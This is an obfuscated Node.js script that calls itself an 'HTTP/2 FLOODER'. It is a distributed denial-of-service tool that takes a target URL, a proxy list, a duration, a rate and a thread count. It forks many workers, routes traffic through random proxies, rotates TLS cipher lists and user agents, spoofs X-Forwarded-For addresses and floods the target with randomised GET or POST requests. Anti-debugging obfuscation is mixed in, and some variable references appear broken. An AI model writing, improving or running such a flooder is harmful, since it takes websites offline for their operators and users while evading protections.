process['on']('uncaughtException', function (_0xb8b6x23) {}), process['on']('unhandledRejection', function (_0xb8b6x24) {}), require('events')['EventEmitter']['defaultMaxListeners'] = 0;
const fs = require('fs');
const url = require('url'),
  randstr = require('randomstring');
colors = require('colors');
var path = require('path');
const cluster = require('cluster'),
  http2 = require('http2');
var fileName = __filename,
  file = path['basename'](fileName);
let headerbuilders,
  COOKIES = undefined,
  POSTDATA = undefined;
process['argv']['length'] < 8 && (console['log']('\t\tHTTP/2 Flood By Virtualization'['red']['bold']), console['log']('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads>'), process['exit'](0));
let randomparam = false;
var proxies = fs['readFileSync'](process['argv'][4], 'utf-8')['toString']()['replace'](/\r/g, '')['split']('\n'),
  rate = process['argv'][6],
  target_url = process['argv'][3];
const target = target_url['split']('""')[0];
process['argv']['forEach'](_0xb8b6x47 => {
  if (_0xb8b6x47['includes']('cookie=') && !process['argv'][2]['split']('""')[0]['includes'](_0xb8b6x47)) {
    COOKIES = _0xb8b6x47['slice'](7);
  } else {
    if (_0xb8b6x47['includes']('postdata=') && !process['argv'][2]['split']('""')[0]['includes'](_0xb8b6x47)) {
      if (process['argv'][2]['toUpperCase']() != 'POST') {
        console['error']('Method Invalid (Has Postdata But Not POST Method)'), process['exit'](1);
      }
      ;
      POSTDATA = _0xb8b6x47['slice'](9);
    } else {
      if (_0xb8b6x47['includes']('randomstring=')) {
        randomparam = _0xb8b6x47['slice'](13), console['log']('(!) RandomString Mode');
      } else {
        if (_0xb8b6x47['includes']('headerdata=')) {
          headerbuilders = {
            'Cache-Control': 'max-age=0',
            'Referer': target,
            'X-Forwarded-For': spoof(),
            'Cookie': COOKIES,
            ':method': 'GET'
          };
          if (_0xb8b6x47['slice'](11)['split']('""')[0]['includes']('&')) {
            const _0xb8b6xc5 = _0xb8b6x47['slice'](11)['split']('""')[0]['split']('&');
            for (let _0xb8b6xc6 = 0; _0xb8b6xc6 < _0xb8b6xc5['length']; _0xb8b6xc6++) {
              const _0xb8b6xc8 = _0xb8b6xc5[_0xb8b6xc6]['split']('=')[0],
                _0xb8b6xc9 = _0xb8b6xc5[_0xb8b6xc6]['split']('=')[1];
              headerbuilders[_0xb8b6xc8] = _0xb8b6xc9;
            }
          } else {
            const _0xb8b6xd1 = _0xb8b6x47['slice'](11)['split']('""')[0],
              _0xb8b6xd2 = _0xb8b6xd1['split']('=')[0],
              _0xb8b6xd3 = _0xb8b6xd1['split']('=')[1];
            headerbuilders[_0xb8b6xd2] = _0xb8b6xd3;
          }
        }
      }
    }
  }
});
COOKIES !== undefined ? console['log']('(!) Custom Cookie Mode') : COOKIES = '';
POSTDATA !== undefined ? console['log']('(!) Custom PostData Mode') : POSTDATA = '';
if (headerbuilders !== undefined) {
  console['log']('(!) Custom HeaderData Mode');
  if (cluster['isMaster']) {
    for (let i = 0; i < process['argv'][7]; i++) {
      cluster['fork'](), console['log']('(!) Creating ' + i + ' thread');
    }
    ;
    console['log']('      \n                    ─────────█▄██▄█\n                    █▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█\n                    ███┼█████▐████▌█████┼███ Now Attacked | HTTP/2 FLOODER\n                    █████████▐████▌█████████'), setTimeout(() => {
      process['exit'](1);
    }, process['argv'][5] * 1000);
  } else {
    startflood();
  }
} else {
  headerbuilders = {
    'Cache-Control': 'max-age=0',
    'Referer': target,
    'X-Forwarded-For': spoof(),
    'Cookie': COOKIES,
    ':method': 'GET'
  };
  if (cluster['isMaster']) {
    for (let i = 0; i < process['argv'][7]; i++) {
      cluster['fork'](), console['log']('(!) Creating ' + i + ' thread');
    }
    ;
    console['log']('\n                    ─────────█▄██▄█\n                    █▄█▄█▄█▄█▐█┼██▌█▄█▄█▄█▄█\n                    ███┼█████▐████▌█████┼███ Now Attacked | HTTP/2 FLOODER\n                    █████████▐████▌█████████'), setTimeout(() => {
      process['exit'](1);
    }, process['argv'][5] * 1000);
  } else {
    startflood();
  }
}
;
var parsed = url['parse'](target);
process['setMaxListeners'](0);
function ra() {
  var _0xb8b6xff = {};
  _0xb8b6xff['charset'] = '0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789';
  _0xb8b6xff['length'] = 0x4;
  const _0xb8b6x106 = randstr['generate'](_0xb8b6xff);
  return _0xb8b6x106;
}
var UAs = fs['readFileSync']('ua.txt', 'utf-8')['replace'](/\r/g, '')['split']('\n');
function spoof() {
  var _0xb8b6x111 = {};
  _0xb8b6x111['length'] = 0x1, _0xb8b6x111['charset'] = '12';
  var _0xb8b6x112 = {};
  _0xb8b6x112['length'] = 0x1, _0xb8b6x112['charset'] = '012345';
  var _0xb8b6x113 = {};
  _0xb8b6x113['length'] = 0x1, _0xb8b6x113['charset'] = '012345';
  var _0xb8b6x11a = {};
  _0xb8b6x11a['length'] = 0x1, _0xb8b6x11a['charset'] = '12';
  var _0xb8b6x11b = {};
  _0xb8b6x11b['length'] = 0x1, _0xb8b6x11b['charset'] = '012345';
  var _0xb8b6x11c = {};
  _0xb8b6x11c['length'] = 0x1;
  _0xb8b6x11c['charset'] = '012345';
  var _0xb8b6x123 = {};
  _0xb8b6x123['length'] = 0x1, _0xb8b6x123['charset'] = '12';
  var _0xb8b6x130 = {};
  _0xb8b6x130['length'] = 0x1, _0xb8b6x130['charset'] = '012345';
  var _0xb8b6x131 = {};
  _0xb8b6x131['length'] = 0x1, _0xb8b6x131['charset'] = '012345';
  var _0xb8b6x132 = {};
  _0xb8b6x132['length'] = 0x1, _0xb8b6x132['charset'] = '12';
  var _0xb8b6x133 = {};
  _0xb8b6x133['length'] = 0x1, _0xb8b6x133['charset'] = '012345';
  var _0xb8b6x134 = {};
  return _0xb8b6x134['length'] = 0x1, _0xb8b6x134['charset'] = '012345', '' + randstr['generate'](_0xb8b6x111) + randstr['generate'](_0xb8b6x112) + randstr['generate'](_0xb8b6x113) + '.' + randstr['generate'](_0xb8b6x11a) + randstr['generate'](_0xb8b6x11b) + randstr['generate'](_0xb8b6x11c) + '.' + randstr['generate'](_0xb8b6x123) + randstr['generate'](_0xb8b6x130) + randstr['generate'](_0xb8b6x131) + '.' + randstr['generate'](_0xb8b6x132) + randstr['generate'](_0xb8b6x133) + randstr['generate'](_0xb8b6x134);
}
const cplist = ['RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA', 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA', 'options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA', ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH', 'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL', 'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5', 'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS', 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'];
(function () {
  var _0xb8b6x14a;
  try {
    var _0xb8b6x15a = function () {
      return function () {}.constructor("return this")();
    };
    _0xb8b6x14a = _0xb8b6x15a();
  } catch (_0x21e216) {
    _0xb8b6x14a = window;
  }
  ;
  _0xb8b6x14a['setInterval'](_0x34632b, 4000);
})();
function startflood() {
  var _0xb8b6x195 = function () {
      var _0xb8b6x249 = true;
      return function (_0xb8b6x24a, _0xb8b6x24b) {
        var _0xb8b6x26c = _0xb8b6x249 ? function () {
          if (_0xb8b6x24b) {
            var _0xb8b6x28b = _0xb8b6x24b['apply'](_0xb8b6x24a, arguments);
            return _0xb8b6x24b = null, _0xb8b6x28b;
          }
        } : function () {};
        return _0xb8b6x249 = false, _0xb8b6x26c;
      };
    }(),
    _0xb8b6x196 = _0xb8b6x195(this, function () {
      return _0xb8b6x196['toString']()['search']('(((.+)+)+)+$')['toString']()['constructor'](_0xb8b6x196)['search']('(((.+)+)+)+$');
    });
  _0xb8b6x196();
  var _0xb8b6x2b2 = function () {
    var _0xb8b6x2f9 = true;
    return function (_0xb8b6x2fa, _0xb8b6x2fb) {
      var _0xb8b6x331 = _0xb8b6x2f9 ? function () {
        if (_0xb8b6x2fb) {
          var _0xb8b6x359 = _0xb8b6x2fb['apply'](_0xb8b6x2fa, arguments);
          return _0xb8b6x2fb = null, _0xb8b6x359;
        }
      } : function () {};
      return _0xb8b6x2f9 = false, _0xb8b6x331;
    };
  }();
  (function () {
    _0xb8b6x2b2(this, function () {
      var _0xb8b6x40f = new RegExp('function *\\( *\\)'),
        _0xb8b6x410 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
        _0xb8b6x411 = _0x34632b('init');
      if (!_0xb8b6x40f['test'](_0xb8b6x411 + 'chain') || !_0xb8b6x410['test'](_0xb8b6x411 + 'input')) {
        _0xb8b6x411('0');
      } else {
        _0x34632b();
      }
    })();
  })();
  var _0xb8b6x418 = function () {
      var _0xb8b6x451 = true;
      return function (_0xb8b6x452, _0xb8b6x453) {
        var _0xb8b6x48a = _0xb8b6x451 ? function () {
          if (_0xb8b6x453) {
            var _0xb8b6x4ba = _0xb8b6x453['apply'](_0xb8b6x452, arguments);
            return _0xb8b6x453 = null, _0xb8b6x4ba;
          }
        } : function () {};
        return _0xb8b6x451 = false, _0xb8b6x48a;
      };
    }(),
    _0xb8b6x419 = _0xb8b6x418(this, function () {
      var _0xb8b6x4e5;
      try {
        var _0xb8b6x4ed = function () {
          return function () {}.constructor("return this")();
        };
        _0xb8b6x4e5 = _0xb8b6x4ed();
      } catch (_0x1236cb) {
        _0xb8b6x4e5 = window;
      }
      ;
      var _0xb8b6x4ee = _0xb8b6x4e5['console'] = _0xb8b6x4e5['console'] || {},
        _0xb8b6x4ef = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
      for (var _0xb8b6x4f0 = 0; _0xb8b6x4f0 < _0xb8b6x4ef['length']; _0xb8b6x4f0++) {
        var _0xb8b6x4f4 = _0xb8b6x418['constructor']['prototype']['bind'](_0xb8b6x418);
        var _0xb8b6x4f3 = _0xb8b6x4ef[_0xb8b6x4f0];
        var _0xb8b6x4f5 = _0xb8b6x4ee[_0xb8b6x4f3] || _0xb8b6x4f4;
        _0xb8b6x4f4['__proto__'] = _0xb8b6x418['bind'](_0xb8b6x418);
        _0xb8b6x4f4['toString'] = _0xb8b6x4f5['toString']['bind'](_0xb8b6x4f5);
        _0xb8b6x4ee[_0xb8b6x4f3] = _0xb8b6x4f4;
      }
    });
  _0xb8b6x419();
  if (process['argv'][2]['toUpperCase']() == 'POST') {
    const _0xb8b6x4fb = url['parse'](target)['path']['replace']('%RAND%', ra());
    headerbuilders[':method'] = 'POST', headerbuilders['Content-Type'] = 'text/plain';
    if (randomparam) {
      setInterval(() => {
        headerbuilders['User-agent'] = UAs[Math['floor'](Math['random']() * UAs['length'])];
        var _0xb8b6x58b = cplist[Math['floor'](Math['random']() * cplist['length'])],
          _0xb8b6x58c = proxies[Math['floor'](Math['random']() * proxies['length'])];
        _0xb8b6x58c = _0xb8b6x58c['split'](':');
        var _0xb8b6x58d = require('http'),
          _0xb8b6x58e = require('tls');
        _0xb8b6x58e['DEFAULT_MAX_VERSION'] = 'TLSv1.3', _0xb8b6x58e['DEFAULT_ECDH_CURVE'], _0xb8b6x58e['authorized'] = true, _0xb8b6x58e['sync'] = true;
        var _0xb8b6x58f = _0xb8b6x58d['request']({
          'host': _0xb8b6x58c[0],
          'port': _0xb8b6x58c[1],
          'ciphers': _0xb8b6x58b,
          'method': 'CONNECT',
          'path': parsed['host'] + ':443'
        }, _0xb8b6x590 => {
          _0xb8b6x58f['end']();
          return;
        });
        _0xb8b6x58f['on']('connect', function (_0xb8b6x5b8, _0xb8b6x5b9, _0xb8b6x5ba) {
          var _0xb8b6x610 = http2['connect'](parsed['href'], {
            'createConnection': () => {
              return _0xb8b6x58e['connect']({
                'host': parsed['host'],
                'ciphers': _0xb8b6x58b,
                'secureProtocol': 'TLS_method',
                'servername': parsed['host'],
                'curve': 'GREASE:X25519:x25519',
                'clientTimeout': 0x1388,
                'clientmaxTimeout': 0x2710,
                'challengesToSolve': 0xa,
                'resolveWithFullResponse': true,
                'HonorCipherOrder': true,
                'Compression': false,
                'UseStapling': true,
                'SessionTickets': false,
                'requestCert': true,
                'gzip': true,
                'port': 0x1bb,
                'sigals': 'rsa_pss_rsae_sha256',
                'strictSSL': false,
                'secure': true,
                'rejectUnauthorized': false,
                'ALPNProtocols': ['h2'],
                'socket': _0xcdc8x30
              }, function () {
                for (var _0xb8b6x638 = 0; _0xb8b6x638 < rate; _0xb8b6x638++) {
                  headerbuilders[':path'] = url['parse'](target)['path']['replace']('%RAND%', ra()) + '?' + randomparam + '=' + randstr['generate']({
                    'length': 0xc,
                    'charset': 'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789'
                  }), headerbuilders['X-Forwarded-For'] = spoof(), headerbuilders['Body'] = '' + (POSTDATA['includes']('%RAND%') ? POSTDATA['replace']('%RAND%', ra()) : POSTDATA), headerbuilders['Cookie']['replace']('%RAND%', ra());
                  var _0xb8b6x639 = _0xb8b6x610['request'](headerbuilders);
                  _0xb8b6x639['end'](), _0xb8b6x639['on']('response', () => {
                    _0xb8b6x639['close']();
                  });
                }
              });
            }
          });
        }), _0xb8b6x58f['end']();
      });
    } else {
      setInterval(() => {
        headerbuilders['User-agent'] = UAs[Math['floor'](Math['random']() * UAs['length'])];
        var _0xb8b6x687 = cplist[Math['floor'](Math['random']() * cplist['length'])],
          _0xb8b6x688 = proxies[Math['floor'](Math['random']() * proxies['length'])];
        _0xb8b6x688 = _0xb8b6x688['split'](':');
        var _0xb8b6x689 = require('http'),
          _0xb8b6x68a = require('tls');
        _0xb8b6x68a['DEFAULT_MAX_VERSION'] = 'TLSv1.3', _0xb8b6x68a['DEFAULT_ECDH_CURVE'], _0xb8b6x68a['authorized'] = true, _0xb8b6x68a['sync'] = true;
        var _0xb8b6x68b = _0xb8b6x689['request']({
          'host': _0xb8b6x688[0],
          'port': _0xb8b6x688[1],
          'ciphers': _0xb8b6x687,
          'method': 'CONNECT',
          'path': parsed['host'] + ':443'
        }, _0xb8b6x68c => {
          _0xb8b6x68b['end']();
          return;
        });
        _0xb8b6x68b['on']('connect', function (_0xb8b6x6b2, _0xb8b6x6b3, _0xb8b6x6b4) {
          var _0xb8b6x728 = http2['connect'](parsed['href'], {
            'createConnection': () => {
              return _0xb8b6x68a['connect']({
                'host': '' + (url['parse'](target)['path']['includes']('%RAND%') ? _0xb8b6x4fb : url['parse'](target)['path']),
                'ciphers': _0xb8b6x687,
                'secureProtocol': 'TLS_method',
                'servername': parsed['host'],
                'curve': 'GREASE:X25519:x25519',
                'clientTimeout': 0x1388,
                'clientmaxTimeout': 0x2710,
                'challengesToSolve': 0xa,
                'resolveWithFullResponse': true,
                'HonorCipherOrder': true,
                'Compression': false,
                'UseStapling': true,
                'SessionTickets': false,
                'requestCert': true,
                'gzip': true,
                'port': 0x1bb,
                'sigals': 'rsa_pss_rsae_sha256',
                'strictSSL': false,
                'secure': true,
                'rejectUnauthorized': false,
                'ALPNProtocols': ['h2'],
                'socket': _0xcdc8x30
              }, function () {
                for (var _0xb8b6x75e = 0; _0xb8b6x75e < rate; _0xb8b6x75e++) {
                  headerbuilders[':path'] = '' + url['parse'](target)['path']['replace']('%RAND%', ra()), headerbuilders['X-Forwarded-For'] = spoof(), headerbuilders['Body'] = '' + (POSTDATA['includes']('%RAND%') ? POSTDATA['replace']('%RAND%', ra()) : POSTDATA), headerbuilders['Cookie']['replace']('%RAND%', ra());
                  var _0xb8b6x75f = _0xb8b6x728['request'](headerbuilders);
                  _0xb8b6x75f['end'](), _0xb8b6x75f['on']('response', () => {
                    _0xb8b6x75f['close']();
                  });
                }
              });
            }
          });
        }), _0xb8b6x68b['end']();
      });
    }
  } else {
    if (process['argv'][2]['toUpperCase']() == 'GET') {
      headerbuilders[':method'] = 'GET';
      if (randomparam) {
        setInterval(() => {
          headerbuilders['User-agent'] = UAs[Math['floor'](Math['random']() * UAs['length'])];
          var _0xb8b6x7d0 = cplist[Math['floor'](Math['random']() * cplist['length'])],
            _0xb8b6x7d1 = proxies[Math['floor'](Math['random']() * proxies['length'])];
          _0xb8b6x7d1 = _0xb8b6x7d1['split'](':');
          var _0xb8b6x7d2 = require('http'),
            _0xb8b6x7d3 = require('tls');
          _0xb8b6x7d3['DEFAULT_MAX_VERSION'] = 'TLSv1.3';
          var _0xb8b6x7d4 = _0xb8b6x7d2['request']({
            'host': _0xb8b6x7d1[0],
            'port': _0xb8b6x7d1[1],
            'ciphers': _0xb8b6x7d0,
            'method': 'CONNECT',
            'path': parsed['host'] + ':443'
          }, _0xb8b6x7d5 => {
            _0xb8b6x7d4['end']();
            return;
          });
          _0xb8b6x7d4['on']('connect', function (_0xb8b6x80c, _0xb8b6x80d, _0xb8b6x80e) {
            var _0xb8b6x82d = http2['connect'](parsed['href'], {
              'createConnection': () => {
                return _0xb8b6x7d3['connect']({
                  'host': parsed['host'],
                  'ciphers': _0xb8b6x7d0,
                  'secureProtocol': 'TLS_method',
                  'servername': parsed['host'],
                  'curve': 'GREASE:X25519:x25519',
                  'clientTimeout': 0x1388,
                  'clientmaxTimeout': 0x2710,
                  'challengesToSolve': 0xa,
                  'resolveWithFullResponse': true,
                  'HonorCipherOrder': true,
                  'Compression': false,
                  'UseStapling': true,
                  'SessionTickets': false,
                  'requestCert': true,
                  'gzip': true,
                  'port': 0x1bb,
                  'sigals': 'rsa_pss_rsae_sha256',
                  'strictSSL': false,
                  'secure': true,
                  'rejectUnauthorized': false,
                  'ALPNProtocols': ['h2'],
                  'socket': _0xcdc8x30
                }, function () {
                  for (var _0xb8b6x86c = 0; _0xb8b6x86c < rate; _0xb8b6x86c++) {
                    headerbuilders[':path'] = url['parse'](target)['path']['replace']('%RAND%', ra()) + '?' + randomparam + '=' + randstr['generate']({
                      'length': 0xc,
                      'charset': 'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789'
                    }), headerbuilders['X-Forwarded-For'] = spoof(), headerbuilders['Cookie']['replace']('%RAND%', ra());
                    var _0xb8b6x86d = _0xb8b6x82d['request'](headerbuilders);
                    _0xb8b6x86d['end'](), _0xb8b6x86d['on']('response', () => {
                      _0xb8b6x86d['close']();
                    });
                  }
                });
              }
            });
          }), _0xb8b6x7d4['end']();
        });
      } else {
        setInterval(() => {
          headerbuilders['User-agent'] = UAs[Math['floor'](Math['random']() * UAs['length'])];
          var _0xb8b6x94a = cplist[Math['floor'](Math['random']() * cplist['length'])],
            _0xb8b6x94b = proxies[Math['floor'](Math['random']() * proxies['length'])];
          _0xb8b6x94b = _0xb8b6x94b['split'](':');
          var _0xb8b6x94c = require('http'),
            _0xb8b6x94d = require('tls');
          _0xb8b6x94d['DEFAULT_MAX_VERSION'] = 'TLSv1.3', _0xb8b6x94d['DEFAULT_ECDH_CURVE'], _0xb8b6x94d['authorized'] = true, _0xb8b6x94d['sync'] = true;
          var _0xb8b6x94e = _0xb8b6x94c['request']({
            'host': _0xb8b6x94b[0],
            'port': _0xb8b6x94b[1],
            'ciphers': _0xb8b6x94a,
            'method': 'CONNECT',
            'path': parsed['host'] + ':443'
          }, _0xb8b6x94f => {
            _0xb8b6x94e['end']();
            return;
          });
          _0xb8b6x94e['on']('connect', function (_0xb8b6x96e, _0xb8b6x96f, _0xb8b6x970) {
            var _0xb8b6x9b1 = http2['connect'](parsed['href'], {
              'createConnection': () => {
                return _0xb8b6x94d['connect']({
                  'host': parsed['host'],
                  'ciphers': _0xb8b6x94a,
                  'secureProtocol': 'TLS_method',
                  'servername': parsed['host'],
                  'curve': 'GREASE:X25519:x25519',
                  'UseStapling': true,
                  'HonorCipherOrder': true,
                  'Compression': false,
                  'challengesToSolve': 0x5,
                  'resolveWithFullResponse': true,
                  'cloudflareTimeout': 0x1388,
                  'cloudflareMaxTimeout': 0x7530,
                  'maxRedirects': 0x14,
                  'followAllRedirects': true,
                  'decodeEmails': false,
                  'gzip': true,
                  'secure': true,
                  'rejectUnauthorized': false,
                  'ALPNProtocols': ['h2'],
                  'socket': _0xb8b6x96f
                }, function () {
                  for (var _0xb8b6x9e0 = 0; _0xb8b6x9e0 < rate; _0xb8b6x9e0++) {
                    headerbuilders[':path'] = '' + url['parse'](target)['path']['replace']('%RAND%', ra()), headerbuilders['X-Forwarded-For'] = spoof(), headerbuilders['Cookie']['replace']('%RAND%', ra());
                    var _0xb8b6x9e1 = _0xb8b6x9b1['request'](headerbuilders);
                    _0xb8b6x9e1['end'](), _0xb8b6x9e1['on']('response', () => {
                      _0xb8b6x9e1['close']();
                    });
                  }
                });
              }
            });
          }), _0xb8b6x94e['end']();
        });
      }
    } else {
      console['log']('(!) Method Invalid'), process['exit'](1);
    }
  }
}
